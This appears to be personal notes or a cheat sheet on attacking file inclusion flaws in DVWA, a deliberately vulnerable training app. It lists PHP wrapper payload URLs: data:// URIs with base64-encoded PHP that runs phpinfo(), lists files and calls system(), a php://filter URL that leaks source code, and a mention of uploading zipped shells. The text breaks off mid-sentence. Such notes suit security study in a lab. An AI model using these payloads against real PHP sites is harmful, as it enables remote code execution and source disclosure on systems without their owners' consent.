## PHP Wrappers

### Data
- PHP Info
	- ` http://192.168.0.104/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== `

	- `PD9waHAgcGhwaW5mbygpOyA/Pg== ` is **Base64** encoded value for `<?php phpinfo(); ?>`
- List all files
	- `http://192.168.0.103/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgJGE9c2NhbmRpcigiLi8iKTtwcmludF9yKCRhKTsgPz4=`
	- `PD9waHAgJGE9c2NhbmRpcigiLi8iKTtwcmludF9yKCRhKTsgPz4=` is **Base64** encoded value for `<? php $a=scandir("./");print_r($a); ?>`
	- Same using system() `<?php system("dir"); ?>	->base64->	PD9waHAgc3lzdGVtKCJkaXIiKTsgPz4K`
	- `http://192.168.0.106/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTsgPz4K`

- 


### Filter

- A good way to get page's **Source Code**..
	- `http://192.168.0.106/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=file1.php`

### ZIP

- We can upload zips with shell and execute them using this 